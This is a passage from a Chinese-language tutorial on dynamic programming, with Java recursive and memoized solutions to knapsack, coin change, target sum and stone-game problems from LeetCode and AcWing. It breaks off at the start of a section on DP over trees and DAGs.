for (int k = 0; k < cuts.length; k++) {\n      if (cuts[k] < j && cuts[k] > i) {\n        res = Math.min(res, dfs(i, cuts[k]) + dfs(cuts[k], j) + j - i);\n      }\n    }\n    return res == Integer.MAX_VALUE ? 0 : res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] cuts;\n  Integer[][] dp;\n  public int minCost(int n, int[] cuts) {\n    this.cuts = cuts;\n    dp = new Integer[n + 1][n + 1];\n    return dfs(0, n);\n  }\n\n  int dfs(int i, int j) {\n    if (i >= j - 1) {\n      return 0;\n    }\n    int res = Integer.MAX_VALUE;\n    for (int k = 0; k < cuts.length; k++) {\n      if (cuts[k] < j && cuts[k] > i) {\n        if (dp[i][cuts[k]] == null) dp[i][cuts[k]] = dfs(i, cuts[k]); \n        if (dp[cuts[k]][j] == null) dp[cuts[k]][j] = dfs(cuts[k], j); \n        res = Math.min(res, dp[i][cuts[k]] + dp[cuts[k]][j] + j - i);\n      }\n    }\n    return res == Integer.MAX_VALUE ? 0 : res;\n  }\n}\n```\n\n由于n最大可以为1e6，所以dp[n+1][n+1]会超出内存限制。所以需要将dfs中的状态换成另一种表示，经过分析发现，可以将dfs中的状态i，j从表示1~n换成表示cuts的下标。代码如下：\n\n递归：\n```java\nclass Solution {\n  int[] points;\n  public int minCost(int n, int[] cuts) {\n    int m = cuts.length;\n    points = new int[m + 2];\n    points[0] = 0;\n    points[m + 1] = n;\n    for (int i = 1; i <= m; i++) {\n      points[i] = cuts[i - 1];\n    }\n    return dfs(0, m + 1);\n  }\n\n  int dfs(int i, int j) {\n    if (points[i] >= points[j] - 1) {\n      return 0;\n    }\n    int res = Integer.MAX_VALUE;\n    for (int k = 1; k < points.length - 1; k++) {\n      if (points[k] < points[j] && points[k] > points[i]) {\n        res = Math.min(res, dfs(i, k) + dfs(k, j) + points[j] - points[i]);\n      }\n    }\n    return res == Integer.MAX_VALUE ? 0 : res;\n  }\n\n}\n```\n\n带有备忘录的递归:\n```java\nclass Solution {\n  int[] points;\n  Integer[][] dp;\n  public int minCost(int n, int[] cuts) {\n    int m = cuts.length;\n    points = new int[m + 2];\n    dp = new Integer[m + 2][m + 2];\n    points[0] = 0;\n    points[m + 1] = n;\n    for (int i = 1; i <= m; i++) {\n      points[i] = cuts[i - 1];\n    }\n    return dfs(0, m + 1);\n  }\n\n  int dfs(int i, int j) {\n    if (points[i] >= points[j] - 1) {\n      return 0;\n    }\n    int res = Integer.MAX_VALUE;\n    for (int k = 1; k < points.length - 1; k++) {\n      if (points[k] < points[j] && points[k] > points[i]) {\n        if (dp[i][k] == null) dp[i][k] = dfs(i, k);\n        if (dp[k][j] == null) dp[k][j] = dfs(k, j);\n        res = Math.min(res, dp[i][k] + dp[k][j] + points[j] - points[i]);\n      }\n    }\n    return res == Integer.MAX_VALUE ? 0 : res;\n  }\n\n}\n```\n\n### 在取值范围上动态规划\n#### 分析模版\n- 状态：`dp[i][j]`: 如果只处理前i个物品，且某个状态值为j的情况下的最优解\n  - 例如：01背包中的`dp[i][j]`表示如果只处理前i个物品，且容量为j的情况下的最多可以装的物品都价值\n- 下一个状态：`dp[i - 1][j - x]`、`dp[i - 1][j]`\n  - `dp[i - 1][j - x]`表示当从`dp[i][j]`时，选择了第i个物品时的下个状态\n  - `dp[i - 1][j]`表示当从`dp[i][j]`时，没有选择第i个物品时的下个状态\n\n#### 例题1: 01背包问题\n[01背包问题](https://www.acwing.com/problem/content/2/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220711155701.png)\n\n##### 分析\n- 状态：`dp[i][j]`: 表示如果只处理前i个物品，且容量为j的情况下的最多可以装的物品都价值\n- 下一个状态：`dp[i - 1][j - v[i]]`、`dp[i - 1][j]`\n- 父子状态之间的递推关系：`dp[i][j] = Math.max(dp[i - 1][j - v[i]] + w[i], dp[i - 1][j])`\n\n##### 递归\n```java\nint N = cin.nextInt();\nint V = cin.nextInt();\nint[] v = new int[N];\nint[] w = new int[N];\n\npublic void solve() {\n  for (int i = 0; i < N; i++) {\n    v[i] = cin.nextInt();\n    w[i] = cin.nextInt();\n  }\n  System.out.println(dfs(N - 1, V));\n}\n\nint dfs(int i, int j) {\n  if (i < 0) {\n    return 0;\n  }\n  return Math.max(j >= v[i] ? dfs(i - 1, j - v[i]) + w[i] : 0, dfs(i - 1, j));\n}\n```\n\n##### 带有备忘录的递归\n```java\nint N = cin.nextInt();\nint V = cin.nextInt();\nint[] v = new int[N];\nint[] w = new int[N];\nInteger[][] dp = new Integer[N + 1][V + 1];\n\npublic void solve() {\n  for (int i = 0; i < N; i++) {\n    v[i] = cin.nextInt();\n    w[i] = cin.nextInt();\n  }\n  System.out.println(dfs(N - 1, V));\n}\n\nint dfs(int i, int j) {\n  if (i < 0 || j <= 0) {\n    return 0;\n  }\n  if (j >= v[i] && dp[i][j - v[i]] == null) {\n    dp[i][j - v[i]] = dfs(i - 1, j - v[i]);\n  }\n  if (dp[i][j] == null) {\n    dp[i][j] = dfs(i - 1, j);\n  }\n  return Math.max(j >= v[i] ? dp[i][j - v[i]] + w[i] : 0, dp[i][j]);\n}\n```\n\n#### 例题2: 分割等和子集\n[分割等和子集](https://leetcode.cn/problems/partition-equal-subset-sum/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220711162835.png)\n\n##### 分析\n- 状态：`dp[i][j]`: 表示从`nums[0...i]`中是否可以取出几个数（也可以不取）加起来为j\n- 下一个状态：`dp[i - 1][j - nums[i]]`、`dp[i - 1][j]`\n- 父子状态之间的递推关系：`dp[i][j] = dp[i - 1][j - nums[i]] + w[i] || dp[i - 1][j]`\n\n##### 递归\n```java\nclass Solution {\n  int[] nums;\n  public boolean canPartition(int[] nums) {\n    this.nums = nums;\n    int sum = 0;\n    for (int num : nums) {\n      sum += num;\n    }\n    if (sum % 2 != 0) return false;\n    return dfs(nums.length - 1, sum / 2);\n  }\n\n  boolean dfs(int i, int j) {\n    if (j == 0) return true;\n    if (i < 0) {\n      return false;\n    }\n    return (j >= nums[i] ? dfs(i - 1, j - nums[i]) : false) || (dfs(i - 1, j));\n  }\n\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] nums;\n  Boolean[][] dp;\n  public boolean canPartition(int[] nums) {\n    int n = nums.length;\n    this.nums = nums;\n    int sum = 0;\n    for (int num : nums) {\n      sum += num;\n    }\n    if (sum % 2 != 0) return false;\n    dp = new Boolean[n + 1][sum / 2 + 1];\n    return dfs(n - 1, sum / 2);\n  }\n\n  boolean dfs(int i, int j) {\n    if (j == 0) return true;\n    if (i < 0) {\n      return false;\n    }\n    if (j >= nums[i] && dp[i][j - nums[i]] == null) {\n      dp[i][j - nums[i]] = dfs(i - 1, j - nums[i]);\n    }\n    if (dp[i][j] == null) {\n      dp[i][j] = dfs(i - 1, j);\n    }\n    return (j >= nums[i] ? dp[i][j - nums[i]] : false) || (dp[i][j]);\n  }\n\n}\n```\n\n#### 例题3: 零钱兑换\n[零钱兑换](https://leetcode.cn/problems/coin-change/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220711170002.png)\n\n##### 分析\n- 状态：`dp[i][j]`: 表示从`nums[0...i]`中取出几个数加起来为j\n- 下一个状态：`dp[i - 1][j - cnt * nums[i]]`、`dp[i - 1][j]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  int[] coins;\n  public int coinChange(int[] coins, int amount) {\n    this.coins = coins;  \n    int res = dfs(coins.length - 1, amount);\n    if (res >= 1e6) return -1;\n    return res;\n  }\n  \n  int dfs(int i, int j) {\n    if (j == 0) return 0;\n    if (i < 0) return (int)1e6;\n    int cnt = 1;\n    int res = (int)1e6;\n    while (j - cnt * coins[i] >= 0) {\n      res = Math.min(res, dfs(i - 1, j - cnt * coins[i]) + cnt);\n      cnt++;\n    }\n    res = Math.min(res, dfs(i - 1, j));\n    return res;\n  }\n\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] coins;\n  Integer[][] dp;\n  public int coinChange(int[] coins, int amount) {\n    this.coins = coins;  \n    dp = new Integer[coins.length][amount + 1];\n    int res = dfs(coins.length - 1, amount);\n    if (res >= 1e6) return -1;\n    return res;\n  }\n  \n  int dfs(int i, int j) {\n    if (j == 0) return 0;\n    if (i < 0) return (int)1e6;\n    int cnt = 1;\n    int res = (int)1e6;\n    while (j - cnt * coins[i] >= 0) {\n      if (dp[i][j - cnt * coins[i]] == null) {\n        dp[i][j - cnt * coins[i]] = dfs(i - 1, j - cnt * coins[i]);\n      }\n      res = Math.min(res, dp[i][j - cnt * coins[i]] + cnt);\n      cnt++;\n    }\n    if (dp[i][j] == null) {\n      dp[i][j] = dfs(i - 1, j);\n    }\n    res = Math.min(res, dp[i][j]);\n    return res;\n  }\n\n}\n```\n\n#### 例题4: 一和零\n[一和零](https://leetcode.cn/problems/ones-and-zeroes/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220712095839.png)\n\n##### 分析\n- 状态：`dp[i][j][z]`: 表示如果只处理前i个字符串，且子集中最多有j个1和z个0时，最大子集的长度\n- 下一个状态：`dp[i - 1][j - oneCnt[i]][z - zeroCnt[i]]`、`dp[i - 1][j][z]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  int[] oneCnt;\n  int[] zeroCnt;\n  public int findMaxForm(String[] strs, int m, int n) {\n    oneCnt = new int[strs.length];\n    zeroCnt = new int[strs.length];\n    for (int i = 0; i < strs.length; i++) {\n      int[] temp = getOneAndZeroCnt(strs[i]);\n      oneCnt[i] = temp[0];\n      zeroCnt[i] = temp[1];\n    }\n    return dfs(strs.length - 1, n, m);\n  }\n\n  int[] getOneAndZeroCnt(String s) {\n    int[] res = new int[2];\n    for (int i = 0; i < s.length(); i++) {\n      if (s.charAt(i) == '1') res[0]++;\n      if (s.charAt(i) == '0') res[1]++;\n    }\n    return res;\n  }\n  \n  int dfs(int i, int j, int z) {\n    if (i < 0) return 0;\n    return Math.max(j >= oneCnt[i] && z >= zeroCnt[i] ? dfs(i - 1, j - oneCnt[i], z - zeroCnt[i]) + 1 : 0, dfs(i - 1, j, z));\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] oneCnt;\n  int[] zeroCnt;\n  Integer[][][] dp;\n  public int findMaxForm(String[] strs, int m, int n) {\n    oneCnt = new int[strs.length];\n    zeroCnt = new int[strs.length];\n    for (int i = 0; i < strs.length; i++) {\n      int[] temp = getOneAndZeroCnt(strs[i]);\n      oneCnt[i] = temp[0];\n      zeroCnt[i] = temp[1];\n    }\n    dp = new Integer[strs.length][n + 1][m + 1];\n    return dfs(strs.length - 1, n, m);\n  }\n\n  int[] getOneAndZeroCnt(String s) {\n    int[] res = new int[2];\n    for (int i = 0; i < s.length(); i++) {\n      if (s.charAt(i) == '1') res[0]++;\n      if (s.charAt(i) == '0') res[1]++;\n    }\n    return res;\n  }\n  \n  int dfs(int i, int j, int z) {\n    if (i < 0) return 0;\n    if (j >= oneCnt[i] && z >= zeroCnt[i] && dp[i][j - oneCnt[i]][z - zeroCnt[i]] == null) {\n      dp[i][j - oneCnt[i]][z - zeroCnt[i]] = dfs(i - 1, j - oneCnt[i], z - zeroCnt[i]) ;\n    }\n    if (dp[i][j][z] == null) {\n      dp[i][j][z] = dfs(i - 1, j, z);\n    }\n    return Math.max(j >= oneCnt[i] && z >= zeroCnt[i] ? dp[i][j - oneCnt[i]][z - zeroCnt[i]] + 1 : 0, dp[i][j][z]);\n  }\n}\n```\n\n#### 例题5: 目标和\n[目标和](https://leetcode.cn/problems/target-sum/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713094619.png)\n\n##### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/nyWst3hzgXM\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n设变量a是nums中变量相加后的结果。设变量b是nums中变量相减后的结果。变量sum为nums中所有数相加后的结果。因此有如下式子：\n```txt\na + b = target\na - b = sum\n==>  a = (target + sum) / 2\n```\n因此我们可以将问题转化为从nums中选择几个数相加后的结果为a的选法个数\n\n- 状态：`dp[i][j]`: 表示如果只处理前i个数，且要求相加结果为j的选法个数\n- 下一个状态：`dp[i - 1][j - nums[i]]`、`dp[i - 1][j]`\n- 父子状态之间的递推关系：`(j >= nums[i] ? dfs(i - 1, j - nums[i] : 0) + dfs(i - 1, j)`\n\n##### 递归\n```java\nclass Solution {\n  int[] nums;\n  public int findTargetSumWays(int[] nums, int target) {\n    this.nums = nums;\n    int sum = 0;\n    for (int num : nums) {\n      sum += num;\n    }\n    int a = sum + target;\n    if (a < 0 || a % 2 != 0) return 0;\n    return dfs(nums.length - 1, a / 2);\n  }\n\n  int dfs(int i, int j) {\n    if (i < 0) {\n      if (j == 0) return 1; \n      return 0;\n    } \n    return (j >= nums[i] ? dfs(i - 1, j - nums[i]) : 0) + dfs(i - 1, j);\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] nums;\n  Integer[][] dp;\n  public int findTargetSumWays(int[] nums, int target) {\n    this.nums = nums;\n    int sum = 0;\n    for (int num : nums) {\n      sum += num;\n    }\n    int a = sum + target;\n    if (a < 0 || a % 2 != 0) return 0;\n    dp = new Integer[nums.length][a / 2 + 1];\n    return dfs(nums.length - 1, a / 2);\n  }\n\n  int dfs(int i, int j) {\n    if (i < 0) {\n      if (j == 0) return 1; \n      return 0;\n    } \n    if (j >= nums[i] && dp[i][j - nums[i]] == null) {\n      dp[i][j - nums[i]] = dfs(i - 1, j - nums[i]);\n    }\n    if (dp[i][j] == null) {\n      dp[i][j] = dfs(i - 1, j);\n    } \n    return (j >= nums[i] ? dp[i][j - nums[i]] : 0) + dp[i][j];\n  }\n}\n```\n\n#### 例题6: 最后一块石头的重量 II\n[最后一块石头的重量 II](https://leetcode.cn/problems/last-stone-weight-ii/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713103952.png)\n\n##### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/bP_hX3-fcqw\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n\n问题转换为，把石头分为两堆,分别是a、b，使a、b差值最小。有如下式子\n```txt\na + b = sum\na - b = diff\n==> 2*a = sum + diff\n==> diff = sum - 2 * a\n```\n所以让diff值最小的话，就是让a最接近sum/2\n\n- 状态：`dp[i][j]`: 表示如果只处理前i个数，且选出几个数相加不超过j的最大值\n- 下一个状态：`dp[i - 1][j - stones[i]]`、`dp[i - 1][j]`\n- 父子状态之间的递推关系：`Math.max(j >= stones[i] ? dp[i][j - stones[i]] + stones[i] : 0, dp[i][j])`\n\n##### 递归\n```java\nclass Solution {\n  int[] stones;\n  public int lastStoneWeightII(int[] stones) {\n    this.stones = stones;\n    int sum = Arrays.stream(stones).sum();\n    int a = dfs(stones.length - 1, sum / 2);\n    return sum - 2 * a;\n  }\n  \n  int dfs(int i, int j) {\n    if (i < 0) return 0;\n    return Math.max(j >= stones[i] ? dfs(i - 1, j - stones[i]) + stones[i] : 0, dfs(i - 1, j));\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] stones;\n  Integer[][] dp;\n  public int lastStoneWeightII(int[] stones) {\n    this.stones = stones;\n    int sum = Arrays.stream(stones).sum();\n    dp = new Integer[stones.length][sum / 2 + 1];\n    int a = dfs(stones.length - 1, sum / 2);\n    return sum - 2 * a;\n  }\n  \n  int dfs(int i, int j) {\n    if (i < 0) return 0;\n    if (j >= stones[i] && dp[i][j - stones[i]] == null) {\n      dp[i][j - stones[i]] = dfs(i - 1, j - stones[i]);\n    }\n    if (dp[i][j] == null) {\n      dp[i][j] = dfs(i - 1, j);\n    }\n    return Math.max(j >= stones[i] ? dp[i][j - stones[i]] + stones[i] : 0, dp[i][j]);\n  }\n}\n```\n\n#### 例题7: 完全背包问题\n[完全背包问题](https://www.acwing.com/problem/content/3/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713110320.png)\n\n- 状态：`dp[i][j]`: 表示如果只处理前i个物品，且容量为j的情况下的最多可以装的物品都价值\n- 下一个状态：`dp[i - 1][j - cnt * v[i]]`、`dp[i - 1][j]`\n- 父子状态之间的递推关系：见递归\n\n##### 递归\n```java\nint N = cin.nextInt();\nint V = cin.nextInt();\nint[] v = new int[N];\nint[] w = new int[N];\n\npublic void solve() {\n  for (int i = 0; i < N; i++) {\n    v[i] = cin.nextInt();\n    w[i] = cin.nextInt();\n  }\n  System.out.println(dfs(N - 1, V));\n}\n\nint dfs(int i, int j) {\n  if (i < 0) return 0;\n  int res = 0;\n  for (int cnt = 0; j >= cnt * v[i]; cnt++) {\n    res = Math.max(res, dfs(i - 1, j - cnt * v[i]) + cnt * w[i]);\n  }\n  return res;\n}\n```\n\n##### 带有备忘录的递归\n```java\nint N = cin.nextInt();\nint V = cin.nextInt();\nint[] v = new int[N];\nint[] w = new int[N];\nInteger[][] dp = new Integer[N][V + 1];\n\npublic void solve() {\n  for (int i = 0; i < N; i++) {\n    v[i] = cin.nextInt();\n    w[i] = cin.nextInt();\n  }\n  System.out.println(dfs(N - 1, V));\n}\n\nint dfs(int i, int j) {\n  if (i < 0) return 0;\n  int res = 0;\n  for (int cnt = 0; j >= cnt * v[i]; cnt++) {\n    if (dp[i][j - cnt * v[i]] == null) {\n      dp[i][j - cnt * v[i]] = dfs(i - 1, j - cnt * v[i]);\n    }\n    res = Math.max(res, dp[i][j - cnt * v[i]] + cnt * w[i]);\n  }\n  return res;\n}\n```\n\n#### 例题8: 零钱兑换 II\n[零钱兑换 II](https://leetcode.cn/problems/coin-change-2/)\n\n- 状态：`dp[i][j]`: 表示从`coins[0...i]`中取出几个数加起来为j的选法个数\n- 下一个状态：`dp[i - 1][j - cnt * coins[i]]`、`dp[i - 1][j]`\n- 父子状态之间的递推关系：见递归\n\n##### 递归\n```java\nclass Solution {\n  int[] coins;\n  public int change(int amount, int[] coins) {\n    this.coins = coins; \n    return dfs(coins.length - 1, amount); \n  }\n  \n  int dfs(int i, int j) {\n    if (i < 0) {\n      if (j == 0) return 1;\n      return 0;\n    }\n    int res = 0;\n    for (int cnt = 0; j >= cnt * coins[i]; cnt++) {\n      res += dfs(i - 1, j - cnt * coins[i]);\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] coins;\n  Integer[][] dp;\n  public int change(int amount, int[] coins) {\n    this.coins = coins; \n    dp = new Integer[coins.length][amount + 1];\n    return dfs(coins.length - 1, amount); \n  }\n  \n  int dfs(int i, int j) {\n    if (i < 0) {\n      if (j == 0) return 1;\n      return 0;\n    }\n    int res = 0;\n    for (int cnt = 0; j >= cnt * coins[i]; cnt++) {\n      if (dp[i][j - cnt * coins[i]] == null) {\n        dp[i][j - cnt * coins[i]] = dfs(i - 1, j - cnt * coins[i]);\n      }\n      res += dp[i][j - cnt * coins[i]];\n    }\n    return res;\n  }\n}\n```\n\n### 博弈类动态规划\n#### 什么是博弈\n链接：https://www.zhihu.com/question/48241066/answer/115476949\n\n问题描述得有点过于简单了，但我认为更多人关注这个问题可能不是为了学习博弈论或者说希望在日常生活中有意识地去应用它，而是仅仅为了通过博弈论中的一些有趣的例子来初步理解。\n\n简单地说，**有多个人进行互动的地方就有博弈**。从这个角度来看，博弈基本是无处不在的。\n\n在回答这个问题的时候，我也是在与各位观众进行一个博弈：怎么去回答才能获得各位的称赞呢？考虑到绝大部分人喜欢听故事、看例子，我找一些比较典型的博弈案例进行回答是不是会比较合适呢？目前的高票答案便是典型：讲述自身的故事，加强认同感和真实性，再加上典型案例。\n\n再比如说，玩游戏、赌博，甚至是决斗，都是一场博弈。有人的地方就有江湖，有多个人互动的地方就有博弈。博弈论研究的是高手间那些看不见的对决，他们往往还没出刀就已经知道了胜负。\n\n#### 分析模版\n一般的模型：`dp[玩家A][状态S]` = `max { Reward[行动X]  + (RemainReward[行动X] - dp[玩家B][状态T])，假设玩家A采取行动X到达状态T }`。\n\n- `dp[玩家A][状态S]`：表示玩家A面对状态S时的最优解\n- `Reward[行动X]`: 表示玩家A采取行动X时所获取到的奖励\n- `RemainReward[行动X]`: 表示玩家A采取行动X后还剩下的奖励\n- `dp[玩家B][状态T]`：表示玩家A采取行动X后到达了状态T时，玩家B面对状态T时的最优解\n\n注意：如果是只有2个玩家的话，可以是不需要存储当前是什么玩家的，因为dfs递归树中父节点与子字节就分别代表着2个不同的玩家。例如：例题3:Nim 游戏\n\n#### 例题1: 石子游戏 II\n[石子游戏 II](https://leetcode.cn/problems/stone-game-ii/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713170724.png)\n\n##### 分析\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/rupxUQrTc3o\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n- 状态：`dp[i][m]`: 表示当第i堆为当前最前面的一堆，并且M=m时，当前玩家可以得到的最多石头\n- 下一个状态：见递归代码\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  int[] piles;\n  int[] preSum;\n  public int stoneGameII(int[] piles) {\n    int n = piles.length;\n    this.piles = piles;\n    preSum = new int[n];\n    preSum[0] = piles[0];\n    for (int i = 1; i < n; i++) {\n      preSum[i] = preSum[i - 1] + piles[i];\n    }\n    return dfs(0, 1);\n  }\n\n  int dfs(int i, int m) {\n    if (i >= piles.length) return 0;\n    int temp = Integer.MAX_VALUE;\n    for (int cnt = 1; cnt <= 2 * m && cnt + i <= piles.length; cnt++) {\n      temp = Math.min(temp, dfs(i + cnt, Math.max(m, cnt)));\n    }\n    return preSum[piles.length - 1] - preSum[i] + piles[i] - temp;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] piles;\n  int[] preSum;\n  Integer[][] dp;\n  public int stoneGameII(int[] piles) {\n    int n = piles.length;\n    this.piles = piles;\n    preSum = new int[n];\n    preSum[0] = piles[0];\n    for (int i = 1; i < n; i++) {\n      preSum[i] = preSum[i - 1] + piles[i];\n    }\n    dp = new Integer[n + 1][n + 1];\n    return dfs(0, 1);\n  }\n\n  int dfs(int i, int m) {\n    if (i >= piles.length) return 0;\n    int temp = Integer.MAX_VALUE;\n    for (int cnt = 1; cnt <= 2 * m && cnt + i <= piles.length; cnt++) {\n      if (dp[i + cnt][Math.max(m, cnt)] == null) {\n        dp[i + cnt][Math.max(m, cnt)] = dfs(i + cnt, Math.max(m, cnt));\n      } \n      temp = Math.min(temp, dp[i + cnt][Math.max(m, cnt)]);\n    }\n    return preSum[piles.length - 1] - preSum[i] + piles[i] - temp;\n  }\n}\n```\n\n#### 例题2: 预测赢家\n[预测赢家](https://leetcode.cn/problems/predict-the-winner/)  \n\n##### 分析\n- 状态：`dp[i][j]`: 表示当前玩家面临着nums[i...j]区间的分数时，所能选择的最大分数\n- 下一个状态：`dp[i + 1][j]`、`dp[i][j - 1]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  int[] preSum;\n  int[] nums;\n  public boolean PredictTheWinner(int[] nums) {\n    int n = nums.length;\n    this.nums = nums;\n    preSum = new int[n + 1];\n    preSum[0] = nums[0];\n    for (int i = 1; i < n; i++) {\n      preSum[i] = preSum[i - 1] + nums[i];\n    }\n    int temp = dfs(0, n - 1);\n    return preSum[n - 1] - preSum[0] + nums[0] - temp <= temp;\n  }\n  \n  int dfs(int i, int j) {\n    if (i > j) return 0;\n    return preSum[j] - preSum[i] + nums[i] - Math.min(dfs(i + 1, j), dfs(i, j - 1));\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] preSum;\n  int[] nums;\n  Integer[][] dp;\n  public boolean PredictTheWinner(int[] nums) {\n    int n = nums.length;\n    this.nums = nums;\n    preSum = new int[n + 1];\n    preSum[0] = nums[0];\n    for (int i = 1; i < n; i++) {\n      preSum[i] = preSum[i - 1] + nums[i];\n    }\n    dp = new Integer[n + 1][n + 1];\n    int temp = dfs(0, n - 1);\n    return preSum[n - 1] - preSum[0] + nums[0] - temp <= temp;\n  }\n  \n  int dfs(int i, int j) {\n    if (i > j) return 0;\n    if (dp[i + 1][j + 1] == null) {\n      dp[i + 1][j + 1] = dfs(i + 1, j);\n    }\n    if (dp[i][j] == null) {\n      dp[i][j] = dfs(i, j - 1);\n    }\n    return preSum[j] - preSum[i] + nums[i] - Math.min(dp[i + 1][j + 1], dp[i][j]);\n  }\n}\n```\n\n#### 例题3: Nim 游戏\n[Nim 游戏](https://leetcode.cn/problems/nim-game/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713145113.png)\n\n##### 分析\n- 状态：`dp[i]`: 表示当前玩家面临着i个石头时，是否能赢得游戏\n- 下一个状态：`dp[i - 1]`、`dp[i - 2]`、`dp[i - 3]`\n- 父子状态之间的递推关系：`dp[i] |= !dfs(i - cnt);`\n\n##### 递归\n```java\nclass Solution {\n  public boolean canWinNim(int n) {\n    return dfs(n);\n  }\n\n  boolean dfs(int i) {\n    if (i <= 0) return false;\n    boolean res = false;\n    for (int cnt = 1; cnt < 4; cnt++) {\n      res |= !dfs(i - cnt);\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  Boolean[] dp;\n  public boolean canWinNim(int n) {\n    dp = new Boolean[n + 4];\n    return dfs(n);\n  }\n\n  boolean dfs(int i) {\n    if (i <= 0) return false;\n    boolean res = false;\n    for (int cnt = 1; cnt < 4; cnt++) {\n      if (dp[i - cnt + 4] == null) {\n        dp[i - cnt + 4] = dfs(i - cnt);\n      }\n      res |= !dp[i - cnt + 4];\n    }\n    return res;\n  }\n}\n```\n\n#### 例题4: 除数博弈\n[除数博弈](https://leetcode.cn/problems/divisor-game/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713172910.png)\n\n##### 分析\n- 状态：`dp[n]`: 表示当前玩家面临着黑板上的数字为n时，是否能赢得游戏\n- 下一个状态：见递归代码\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  public boolean divisorGame(int n) {\n    return dfs(n);\n  }\n  \n  boolean dfs(int n) {\n    boolean res = false;\n    for (int x = 1; x < n; x ++) {\n      if (n % x == 0) {\n        res |= !dfs(n - x);\n      }\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  Boolean[] dp;\n  public boolean divisorGame(int n) {\n    dp = new Boolean[n + 1];\n    return dfs(n);\n  }\n  \n  boolean dfs(int n) {\n    boolean res = false;\n    for (int x = 1; x < n; x ++) {\n      if (n % x == 0) {\n        if (dp[n - x] == null) {\n          dp[n - x] = dfs(n - x);\n        }\n        res |= !dp[n - x];\n      }\n    }\n    return res;\n  }\n}\n```\n\n#### 例题5: 石子游戏\n[石子游戏](https://leetcode.cn/problems/stone-game/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220713185427.png)\n\n##### 分析\n- 状态：`dp[i][j]`: 表示当前玩家面临着piles[i...j]区间的石子时，所能选择的最多石子\n- 下一个状态：`dp[i + 1][j]`、`dp[i][j - 1]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  int[] piles;\n  int[] preSum;\n  public boolean stoneGame(int[] piles) {\n    int n = piles.length;\n    this.piles = piles;\n    preSum = new int[n];\n    preSum[0] = piles[0];\n    for (int i = 1; i < n; i++) {\n      preSum[i] = preSum[i - 1] + piles[i];\n    }\n    int temp = dfs(0, n - 1);\n    return 2 * temp > preSum[n - 1];\n  }\n  \n  int dfs(int i, int j) {\n    if (i > j) return 0;\n    return preSum[j] - preSum[i] + piles[i] - Math.min(dfs(i + 1, j), dfs(i, j - 1));\n  }\n  \n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] piles;\n  int[] preSum;\n  Integer[][] dp;\n  public boolean stoneGame(int[] piles) {\n    int n = piles.length;\n    this.piles = piles;\n    preSum = new int[n];\n    preSum[0] = piles[0];\n    for (int i = 1; i < n; i++) {\n      preSum[i] = preSum[i - 1] + piles[i];\n    }\n    dp = new Integer[n + 1][n + 1];\n    int temp = dfs(0, n - 1);\n    return 2 * temp > preSum[n - 1];\n  }\n  \n  int dfs(int i, int j) {\n    if (i > j) return 0;\n    if (dp[i + 1][j + 1] == null) {\n      dp[i + 1][j + 1] = dfs(i + 1, j);\n    }\n    if (dp[i][j] == null) {\n      dp[i][j] = dfs(i, j - 1);\n    }\n    return preSum[j] - preSum[i] + piles[i] - Math.min(dp[i + 1][j + 1], dp[i][j]);\n  }\n  \n}\n```\n\n### 在树上或DAG上动态规划\n#### 分析模版\n- 状态：`dp[状态A]`: 表示从状态A开始所能获取到的最优解\n- 下一个状态：状态A所能到达的所有下一个状态\n\n#### 例题1:网格图中递增路径的数目\n[网格图中递增路径的数目](https://leetcode.cn/problems/number-of-increasing-paths-in-a-grid/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220714163050.png)\n\n##### 分析\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/BbbnnoE-NqY\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; 